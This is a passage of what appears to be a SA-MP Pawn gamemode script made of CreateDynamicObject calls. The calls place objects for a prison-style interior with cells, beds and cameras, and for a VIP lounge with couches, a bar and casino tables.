	CreateDynamicObject(3095,188.48242188,1797.18066406,1616.96374512,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(a51_jetdoor) (69)
	CreateDynamicObject(3095,188.47740173,1788.21972656,1616.96374512,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(a51_jetdoor) (70)
	CreateDynamicObject(3095,188.47656250,1788.21972656,1612.68920898,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(a51_jetdoor) (71)
	CreateDynamicObject(970,195.12841797,1801.67028809,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (10)
	CreateDynamicObject(970,198.36718750,1801.64648438,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (12)
	CreateDynamicObject(970,195.12792969,1801.66992188,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (13)
	CreateDynamicObject(970,192.93154907,1799.55737305,1613.81237793,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (14)
	CreateDynamicObject(970,192.93154907,1795.31909180,1613.81237793,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (15)
	CreateDynamicObject(970,192.93066406,1799.55664062,1618.06286621,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (17)
	CreateDynamicObject(970,192.93066406,1795.31835938,1618.06286621,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (18)
	CreateDynamicObject(3095,197.45889282,1786.73498535,1612.68823242,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (72)
	CreateDynamicObject(970,192.90052795,1793.24084473,1613.81237793,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (19)
	CreateDynamicObject(3095,197.48855591,1786.73596191,1613.26379395,0.00000000,180.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (73)
	CreateDynamicObject(3095,197.48828125,1786.73535156,1617.53601074,0.00000000,179.99450684,0.00000000, .interiorid = 69); //object(a51_jetdoor) (74)
	CreateDynamicObject(3095,197.45800781,1786.73437500,1616.96301270,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (76)
	CreateDynamicObject(3095,206.43820190,1786.73596191,1613.26379395,0.00000000,179.99450684,0.00000000, .interiorid = 69); //object(a51_jetdoor) (77)
	CreateDynamicObject(3095,206.42300415,1786.73400879,1612.68823242,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (78)
	CreateDynamicObject(970,192.90039062,1793.24023438,1618.06286621,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(fencesmallb) (20)
	CreateDynamicObject(970,195.08341980,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (21)
	CreateDynamicObject(970,199.35119629,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (22)
	CreateDynamicObject(970,203.61909485,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (23)
	CreateDynamicObject(970,207.91763306,1791.18090820,1613.81237793,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (24)
	CreateDynamicObject(970,195.08300781,1791.18066406,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (25)
	CreateDynamicObject(970,199.35058594,1791.18066406,1618.06286621,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(fencesmallb) (26)
	CreateDynamicObject(12950,214.32031250,1789.71875000,1609.79418945,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(cos_sbanksteps03) (1)
	CreateDynamicObject(12950,205.98063660,1789.62817383,1614.14453125,0.00000000,0.00000000,90.00000000, .interiorid = 69); //object(cos_sbanksteps03) (2)
	CreateDynamicObject(3095,206.42285156,1786.73339844,1612.46301270,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(a51_jetdoor) (80)
	CreateDynamicObject(3095,206.44000244,1786.72985840,1613.03833008,0.00000000,179.99450684,0.00000000, .interiorid = 69); //object(a51_jetdoor) (82)
	CreateDynamicObject(3095,206.40036011,1789.18249512,1607.96301270,90.00000000,180.00000000,180.00000000, .interiorid = 69); //object(a51_jetdoor) (83)
	CreateDynamicObject(3095,210.93899536,1786.74987793,1608.16320801,90.00000000,179.99450684,90.01101685, .interiorid = 69); //object(a51_jetdoor) (84)
	CreateDynamicObject(3095,210.35997009,1786.72998047,1608.18823242,90.00000000,180.00549316,269.98904419, .interiorid = 69); //object(a51_jetdoor) (85)
	CreateDynamicObject(3095,206.40390015,1791.20959473,1605.71276855,90.00000000,179.99450684,179.99450684, .interiorid = 69); //object(a51_jetdoor) (86)
	CreateDynamicObject(3095,202.45399475,1786.74548340,1608.16320801,90.00000000,179.99450684,90.01098633, .interiorid = 69); //object(a51_jetdoor) (87)
	CreateDynamicObject(3095,201.88999939,1786.72998047,1608.18823242,90.00000000,180.00549316,269.98901367, .interiorid = 69); //object(a51_jetdoor) (88)
	CreateDynamicObject(1779,209.17303467,1789.21142578,1610.04138184,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(cj_ticketmachine) (1)
	CreateDynamicObject(1779,208.34777832,1789.21301270,1610.04138184,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(cj_ticketmachine) (2)
	CreateDynamicObject(1649,208.50978088,1790.75683594,1610.97937012,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(wglasssmash) (1)
	CreateDynamicObject(1649,208.68554688,1790.97949219,1610.97937012,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(wglasssmash) (2)
	CreateDynamicObject(1649,204.25000000,1790.98034668,1610.97937012,0.00000000,0.00000000,179.99450684, .interiorid = 69); //object(wglasssmash) (4)
	CreateDynamicObject(1649,204.12200928,1790.77050781,1610.97937012,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(wglasssmash) (5)
	CreateDynamicObject(1671,207.08955383,1789.63757324,1609.42346191,0.00000000,0.00000000,170.00000000, .interiorid = 69); //object(swivelchair_a) (1)
	CreateDynamicObject(1671,204.79295349,1789.67260742,1609.42346191,0.00000000,0.00000000,181.99694824, .interiorid = 69); //object(swivelchair_a) (2)
	CreateDynamicObject(1886,192.97596741,1791.22827148,1612.89184570,0.00000000,0.00000000,122.00000000, .interiorid = 69); //object(shop_sec_cam) (1)
	CreateDynamicObject(1886,192.97558594,1791.22753906,1617.09228516,0.00000000,0.00000000,149.99768066, .interiorid = 69); //object(shop_sec_cam) (2)
	CreateDynamicObject(1886,191.98481750,1789.51403809,1621.04223633,30.00000000,0.00000000,119.99633789, .interiorid = 69); //object(shop_sec_cam) (3)
	CreateDynamicObject(1886,216.65586853,1790.06823730,1621.04223633,29.99816895,0.00000000,219.99270630, .interiorid = 69); //object(shop_sec_cam) (4)
	CreateDynamicObject(1886,191.82667542,1802.56311035,1621.16735840,11.00000000,0.00000000,82.26770020, .interiorid = 69); //object(shop_sec_cam) (5)
	CreateDynamicObject(1886,191.82617188,1802.56250000,1617.04248047,10.99731445,0.00000000,82.26562500, .interiorid = 69); //object(shop_sec_cam) (6)
	CreateDynamicObject(1886,191.82617188,1802.56250000,1612.81799316,10.99731445,0.00000000,82.26562500, .interiorid = 69); //object(shop_sec_cam) (7)
	CreateDynamicObject(2163,203.82183838,1791.07727051,1609.16345215,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(med_office_unit_2) (1)
	CreateDynamicObject(2163,206.70214844,1791.09375000,1609.16345215,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(med_office_unit_2) (2)
	CreateDynamicObject(2949,201.87556458,1790.66833496,1608.96325684,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(kmb_lockeddoor) (1)
	CreateDynamicObject(2949,202.47567749,1789.17675781,1608.96325684,0.00000000,0.00000000,179.99993896, .interiorid = 69); //object(kmb_lockeddoor) (2)
	CreateDynamicObject(2611,205.84300232,1789.22143555,1610.90124512,0.00000000,0.00000000,180.00000000, .interiorid = 69); //object(police_nb1) (1)
	CreateDynamicObject(2606,210.55937195,1789.67712402,1611.38903809,0.00000000,0.00000000,270.00000000, .interiorid = 69); //object(cj_police_counter2) (1)
	CreateDynamicObject(2606,210.55859375,1789.67675781,1611.86450195,0.00000000,0.00000000,269.99450684, .interiorid = 69); //object(cj_police_counter2) (2)
	CreateDynamicObject(1800,214.45210266,1805.61340332,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (3)
	CreateDynamicObject(1800,210.21595764,1805.59899902,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (4)
	CreateDynamicObject(1800,205.95664978,1805.66284180,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (5)
	CreateDynamicObject(1800,200.50657654,1805.64892578,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (6)
	CreateDynamicObject(1800,196.11277771,1805.65185547,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (7)
	CreateDynamicObject(1800,191.83377075,1805.65478516,1617.53454590,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (8)
	CreateDynamicObject(1800,214.45761108,1805.68225098,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (9)
	CreateDynamicObject(1800,210.19975281,1805.67297363,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (10)
	CreateDynamicObject(1800,205.95896912,1805.70129395,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (11)
	CreateDynamicObject(1800,200.48924255,1805.69775391,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (12)
	CreateDynamicObject(1800,196.09724426,1805.65148926,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (13)
	CreateDynamicObject(1800,191.82055664,1805.65979004,1613.26037598,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (14)
	CreateDynamicObject(1800,214.42187500,1805.65441895,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (15)
	CreateDynamicObject(1800,210.21253967,1805.68786621,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (16)
	CreateDynamicObject(1800,205.94084167,1805.60290527,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (17)
	CreateDynamicObject(1800,205.94042969,1805.60253906,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (18)
	CreateDynamicObject(1800,210.21191406,1805.68750000,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (19)
	CreateDynamicObject(1800,200.50958252,1805.69555664,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (20)
	CreateDynamicObject(1800,200.50878906,1805.69531250,1609.96044922,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (21)
	CreateDynamicObject(1800,196.10487366,1805.67517090,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (22)
	CreateDynamicObject(1800,196.10449219,1805.67480469,1609.96044922,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (23)
	CreateDynamicObject(1800,191.86831665,1805.67456055,1608.98449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (24)
	CreateDynamicObject(1800,191.86816406,1805.67382812,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (25)
	CreateDynamicObject(1800,214.42187500,1805.65429688,1609.93542480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (26)
	CreateDynamicObject(1800,214.45703125,1805.68164062,1614.23632812,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (27)
	CreateDynamicObject(1800,210.19921875,1805.67285156,1614.23632812,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (28)
	CreateDynamicObject(1800,205.95800781,1805.70117188,1614.21130371,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (29)
	CreateDynamicObject(1800,200.48828125,1805.69726562,1614.23535156,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (30)
	CreateDynamicObject(1800,196.09667969,1805.65136719,1614.18627930,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (31)
	CreateDynamicObject(1800,191.82031250,1805.65917969,1614.23632812,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (32)
	CreateDynamicObject(1800,191.83300781,1805.65429688,1618.50952148,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (33)
	CreateDynamicObject(1800,196.11230469,1805.65136719,1618.48498535,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (34)
	CreateDynamicObject(1800,200.50585938,1805.64843750,1618.51049805,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (35)
	CreateDynamicObject(1800,205.95605469,1805.66210938,1618.48449707,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (36)
	CreateDynamicObject(1800,210.21582031,1805.59863281,1618.51049805,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (37)
	CreateDynamicObject(1800,214.45117188,1805.61328125,1618.48547363,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(low_bed_1) (38)
	CreateDynamicObject(2774,204.40760803,1803.95361328,1619.56640625,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(cj_airp_pillars) (1)
	CreateDynamicObject(2602,194.12474060,1808.81152344,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (1)
	CreateDynamicObject(2602,198.33770752,1808.81555176,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (2)
	CreateDynamicObject(2602,202.66923523,1808.81469727,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (3)
	CreateDynamicObject(2602,208.20339966,1808.82031250,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (4)
	CreateDynamicObject(2602,212.51039124,1808.82153320,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (5)
	CreateDynamicObject(2602,216.61041260,1808.82446289,1613.78393555,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (7)
	CreateDynamicObject(2602,216.61035156,1808.82421875,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (8)
	CreateDynamicObject(2602,212.43417358,1808.79223633,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (9)
	CreateDynamicObject(2602,208.18164062,1808.78283691,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (10)
	CreateDynamicObject(2602,202.55258179,1808.80847168,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (11)
	CreateDynamicObject(2602,198.22427368,1808.81884766,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (12)
	CreateDynamicObject(2602,194.07098389,1808.83593750,1618.06042480,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (13)
	CreateDynamicObject(2602,194.07031250,1808.83593750,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (15)
	CreateDynamicObject(2602,198.34811401,1808.82019043,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (16)
	CreateDynamicObject(2602,202.64959717,1808.82995605,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (17)
	CreateDynamicObject(2602,208.22689819,1808.85144043,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (18)
	CreateDynamicObject(2602,212.45510864,1808.80895996,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (19)
	CreateDynamicObject(2602,216.65698242,1808.81689453,1609.50891113,0.00000000,0.00000000,0.00000000, .interiorid = 69); //object(police_cell_toilet) (20)
	CreateDynamicObject(3388,204.12251282,1788.69470215,1608.96325684,0.00000000,0.00000000,270.00000000, .interiorid = 69); //object(a51_srack4_) (1)
	// Streamer_Update()

	//VIP
	Create3DTextLabel("{FFFFFF}VIP Locker\n{EEE72A}(/viplocker to access the locker)", 0x008080FF, 2561.32519531,1403.24609375,7699.56640625,5.0, 363636, 0);
	CreateDynamicObject(14614,2533.68457031,1416.85351562,7705.11816406,0.00000000,0.00000000,0.00000000); //object(triad_main3) (1)
	CreateDynamicObject(14607,2533.54492188,1417.93652344,7705.11572266,0.00000000,0.00000000,359.74731445); //object(triad_main2) (2)
	CreateDynamicObject(14563,2533.70019531,1419.26757812,7705.11376953,0.00000000,0.00000000,0.00000000); //object(triad_main) (1)
	CreateDynamicObject(3533,2544.49926758,1432.28100586,7702.83007812,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (1)
	CreateDynamicObject(3533,2544.46289062,1403.82421875,7702.83007812,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(14561,2584.83007812,1417.66503906,7704.10937500,0.00000000,0.00000000,179.74731445); //object(triad_neon) (2)
	CreateDynamicObject(3533,2569.09399414,1406.85668945,7705.23632812,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(3533,2569.12109375,1428.65820312,7705.23632812,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(1846,2502.62304688,1391.47949219,7699.94970703,90.00000000,90.00000000,269.98901367); //object(shop_shelf04) (1)
	CreateDynamicObject(8664,2470.62500000,1449.24902344,7707.08886719,0.00000000,179.99450684,269.98901367); //object(casrylegrnd_lvs) (2)
	CreateDynamicObject(3534,2522.69213867,1427.96093750,7705.81347656,179.99450684,0.00000000,0.00000000); //object(trdlamp01) (1)
	CreateDynamicObject(3534,2520.36645508,1407.96240234,7705.81347656,179.99450684,0.00000000,0.00000000); //object(trdlamp01) (2)
	CreateDynamicObject(3534,2505.93945312,1408.00488281,7705.81347656,179.99450684,0.00000000,0.00000000); //object(trdlamp01) (3)
	CreateDynamicObject(3534,2507.41162109,1428.69897461,7705.81347656,179.99450684,0.00000000,0.00000000); //object(trdlamp01) (4)
	CreateDynamicObject(14537,2555.20019531,1417.82421875,7700.75244141,0.00000000,0.00000000,269.74731445); //object(pdomesbar) (1)
	CreateDynamicObject(1703,2561.78857422,1430.46569824,7698.58447266,0.00000000,0.00000000,0.00000000); //object(kb_couch02) (1)
	CreateDynamicObject(1703,2565.56933594,1429.20166016,7698.58447266,0.00000000,0.00000000,269.75000000); //object(kb_couch02) (2)
	CreateDynamicObject(1703,2560.29028320,1427.15185547,7698.58447266,0.00000000,0.00000000,89.49731445); //object(kb_couch02) (3)
	CreateDynamicObject(2126,2562.40576172,1427.81384277,7698.58447266,0.00000000,0.00000000,0.00000000); //object(coffee_swank_5) (1)
	CreateDynamicObject(644,2565.03710938,1431.16113281,7698.78466797,0.00000000,0.00000000,0.00000000); //object(pot_02) (1)
	CreateDynamicObject(1703,2549.62744141,1430.27490234,7698.58447266,0.00000000,0.00000000,0.00000000); //object(kb_couch02) (4)
	CreateDynamicObject(1703,2548.02905273,1427.33349609,7698.58447266,0.00000000,0.00000000,89.49462891); //object(kb_couch02) (5)
	CreateDynamicObject(1703,2553.11743164,1429.18188477,7698.58447266,0.00000000,0.00000000,269.74731445); //object(kb_couch02) (6)
	CreateDynamicObject(2126,2550.10009766,1427.68005371,7698.58447266,0.00000000,0.00000000,0.00000000); //object(coffee_swank_5) (2)
	CreateDynamicObject(2208,2556.58935547,1430.02514648,7698.58447266,0.00000000,0.00000000,269.99996948); //object(med_office7_unit_1) (1)
	CreateDynamicObject(644,2556.64257812,1432.07714844,7698.78466797,0.00000000,0.00000000,0.00000000); //object(pot_02) (3)
	CreateDynamicObject(644,2545.51367188,1430.76379395,7698.78466797,0.00000000,0.00000000,0.00000000); //object(pot_02) (4)
	CreateDynamicObject(3528,2542.58496094,1414.42236328,7707.52832031,0.00000000,0.00000000,81.75000000); //object(vgsedragon) (1)
	CreateDynamicObject(13656,2549.15917969,1425.01318359,7691.92236328,0.00000000,0.00000000,0.00000000); //object(fuckknows) (1)
	CreateDynamicObject(1702,2500.81054688,1398.09545898,7696.57470703,0.00000000,0.00000000,0.00000000); //object(kb_couch06) (1)
	CreateDynamicObject(1702,2497.05859375,1398.17089844,7696.57470703,0.00000000,0.00000000,0.00000000); //object(kb_couch06) (2)
	CreateDynamicObject(1822,2499.40185547,1397.70947266,7696.57470703,0.00000000,0.00000000,0.00000000); //object(coffee_swank_6) (1)
	CreateDynamicObject(1705,2496.42871094,1395.96105957,7696.57470703,0.00000000,0.00000000,90.00000000); //object(kb_chair04) (1)
	CreateDynamicObject(1702,2508.76733398,1398.05688477,7696.57470703,0.00000000,0.00000000,269.99996948); //object(kb_couch06) (3)
	CreateDynamicObject(1702,2508.77172852,1391.88793945,7696.57470703,0.00000000,0.00000000,269.99450684); //object(kb_couch06) (4)
	CreateDynamicObject(1705,2508.75927734,1394.53845215,7696.57470703,0.00000000,0.00000000,269.74996948); //object(kb_chair04) (2)
	CreateDynamicObject(2010,2496.33740234,1398.38879395,7696.60791016,0.00000000,0.00000000,0.00000000); //object(nu_plant3_ofc) (1)
	CreateDynamicObject(3528,2541.61718750,1421.13610840,7707.52832031,0.00000000,0.00000000,284.00000000); //object(vgsedragon) (1)
	CreateDynamicObject(1557,2581.77954102,1416.19738770,7700.99072266,0.00000000,0.00000000,89.75000000); //object(gen_doorext19) (1)
	CreateDynamicObject(1557,2581.77709961,1419.24938965,7700.99072266,0.00000000,0.00000000,269.74731445); //object(gen_doorext19) (2)
	CreateDynamicObject(3533,2525.58374023,1403.63500977,7700.82812500,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(3533,2525.65917969,1433.01574707,7700.82812500,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(3533,2502.09692383,1403.54077148,7700.82812500,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(3533,2502.05957031,1432.68359375,7700.82812500,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(2232,2502.62475586,1404.12939453,7701.62158203,29.99816895,0.00000000,137.49841309); //object(med_speaker_4) (2)
	CreateDynamicObject(2232,2502.66284180,1432.12524414,7701.79736328,29.99267578,0.00000000,49.99328613); //object(med_speaker_4) (3)
	CreateDynamicObject(2232,2525.13916016,1432.33178711,7703.54345703,29.98718262,0.00000000,319.73925781); //object(med_speaker_4) (4)
	CreateDynamicObject(2232,2524.96215820,1404.17626953,7703.54345703,29.98168945,0.00000000,225.48889160); //object(med_speaker_4) (5)
	CreateDynamicObject(14434,2511.20556641,1425.14147949,7706.56093750,0.00000000,0.00000000,0.00000000); //object(carter-spotlight42) (1)
	CreateDynamicObject(14434,2517.55908203,1412.60461426,7706.56103516,0.00000000,0.00000000,179.74731445); //object(carter-spotlight42) (2)
	CreateDynamicObject(2802,2496.60351562,1452.96240234,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (1)
	CreateDynamicObject(2802,2500.60888672,1455.75598145,7696.91699219,0.00000000,0.00000000,83.75000000); //object(castable1) (2)
	CreateDynamicObject(2802,2505.04809570,1455.83142090,7696.91699219,0.00000000,0.00000000,83.74877930); //object(castable1) (3)
	CreateDynamicObject(2802,2508.61010742,1453.67211914,7696.91699219,0.00000000,0.00000000,185.49877930); //object(castable1) (4)
	CreateDynamicObject(2802,2508.56738281,1444.14099121,7696.91699219,0.00000000,0.00000000,185.49865723); //object(castable1) (5)
	CreateDynamicObject(2802,2508.53784180,1439.81018066,7696.91699219,0.00000000,0.00000000,10.24865723); //object(castable1) (6)
	CreateDynamicObject(2802,2496.62451172,1448.15747070,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (7)
	CreateDynamicObject(2802,2496.67675781,1443.45410156,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (8)
	CreateDynamicObject(2802,2496.61523438,1438.70251465,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (9)
	CreateDynamicObject(2802,2500.53320312,1452.66955566,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (10)
	CreateDynamicObject(2802,2504.76513672,1452.47546387,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (11)
	CreateDynamicObject(2802,2504.43212891,1447.91577148,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (12)
	CreateDynamicObject(2802,2504.61816406,1442.34155273,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (13)
	CreateDynamicObject(2802,2500.46679688,1442.34082031,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (14)
	CreateDynamicObject(2802,2500.64111328,1447.44116211,7696.91699219,0.00000000,0.00000000,0.00000000); //object(castable1) (15)
	CreateDynamicObject(8664,2460.33349609,1334.99987793,7705.18896484,0.00000000,179.99450684,358.98901367); //object(casrylegrnd_lvs) (2)
	CreateDynamicObject(8664,2466.37988281,1506.99414062,7705.18896484,0.00000000,179.99450684,269.98352051); //object(casrylegrnd_lvs) (2)
	CreateDynamicObject(1702,2496.41601562,1392.63623047,7696.57470703,0.00000000,0.00000000,90.00000000); //object(kb_couch06) (2)
	CreateDynamicObject(1702,2496.45556641,1388.72924805,7696.57470703,0.00000000,0.00000000,90.00000000); //object(kb_couch06) (2)
	CreateDynamicObject(1702,2496.42236328,1382.17553711,7696.57470703,0.00000000,0.00000000,90.00000000); //object(kb_couch06) (2)
	CreateDynamicObject(1702,2499.56835938,1379.86389160,7696.57470703,0.00000000,0.00000000,180.25000000); //object(kb_couch06) (2)
	CreateDynamicObject(1702,2503.86328125,1379.84350586,7696.57470703,0.00000000,0.00000000,180.24719238); //object(kb_couch06) (2)
	CreateDynamicObject(1702,2508.63720703,1379.85156250,7696.57470703,0.00000000,0.00000000,180.24719238); //object(kb_couch06) (2)
	CreateDynamicObject(1702,2508.78320312,1384.55676270,7696.57470703,0.00000000,0.00000000,270.24722290); //object(kb_couch06) (2)
	CreateDynamicObject(1822,2495.96850586,1391.05432129,7696.58007812,0.00000000,0.00000000,0.00000000); //object(coffee_swank_6) (2)
	CreateDynamicObject(1822,2500.17749023,1379.41052246,7696.58007812,0.00000000,0.00000000,0.00000000); //object(coffee_swank_6) (4)
	CreateDynamicObject(1822,2504.73486328,1379.36376953,7696.58007812,0.00000000,0.00000000,0.00000000); //object(coffee_swank_6) (5)
	CreateDynamicObject(1822,2508.29492188,1381.23937988,7696.58007812,0.00000000,0.00000000,0.00000000); //object(coffee_swank_6) (6)
	CreateDynamicObject(2592,2502.65625000,1385.34570312,7697.48876953,0.00000000,0.00000000,0.00000000); //object(ab_slottable) (1)
	CreateDynamicObject(14391,2518.39965820,1395.66064453,7697.63281250,0.00000000,0.00000000,137.75000000); //object(dr_gsnew07) (1)
	CreateDynamicObject(2773,2513.80834961,1391.35119629,7697.49023438,0.00000000,0.00000000,287.00000000); //object(cj_airprt_bar) (1)
	CreateDynamicObject(2773,2511.01782227,1390.83972168,7697.49023438,0.00000000,0.00000000,273.74584961); //object(cj_airprt_bar) (2)
	CreateDynamicObject(2773,2511.01586914,1398.82482910,7697.49023438,0.00000000,0.00000000,285.49584961); //object(cj_airprt_bar) (3)
	CreateDynamicObject(2773,2513.54321289,1400.46667480,7697.47998047,0.00000000,0.00000000,322.49072266); //object(cj_airprt_bar) (4)
	CreateDynamicObject(2773,2514.37133789,1402.14062500,7697.49023438,0.00000000,0.00000000,345.23721313); //object(cj_airprt_bar) (5)
	CreateDynamicObject(2773,2516.00585938,1403.10449219,7697.49023438,0.00000000,358.50000000,270.74584961); //object(cj_airprt_bar) (6)
	CreateDynamicObject(2773,2518.39916992,1403.09533691,7697.49023438,0.00000000,358.49487305,269.99157715); //object(cj_airprt_bar) (7)
	CreateDynamicObject(2773,2521.51806641,1403.08837891,7697.49023438,0.00000000,358.49487305,269.98901367); //object(cj_airprt_bar) (8)
	CreateDynamicObject(2773,2522.30200195,1401.77014160,7697.49023438,0.00000000,358.49487305,173.23901367); //object(cj_airprt_bar) (9)
	CreateDynamicObject(2773,2521.81201172,1399.49047852,7697.49023438,0.00000000,358.49487305,163.23791504); //object(cj_airprt_bar) (10)
	CreateDynamicObject(1541,2503.42236328,1385.51770020,7698.08593750,0.00000000,0.00000000,179.75000000); //object(cj_beer_taps_1) (1)
	CreateDynamicObject(1545,2501.91772461,1385.48803711,7698.16455078,0.00000000,0.00000000,0.00000000); //object(cj_b_optic1) (1)
	CreateDynamicObject(14562,2487.84570312,1418.30541992,7699.85156250,0.00000000,0.00000000,0.00000000); //object(triad_lion) (1)
	CreateDynamicObject(16101,2517.80395508,1435.93750000,7696.97753906,0.00000000,0.00000000,0.00000000); //object(des_windsockpole) (1)
	CreateDynamicObject(3533,2511.56665039,1388.92163086,7700.82812500,0.00000000,0.00000000,0.00000000); //object(trdpillar01) (2)
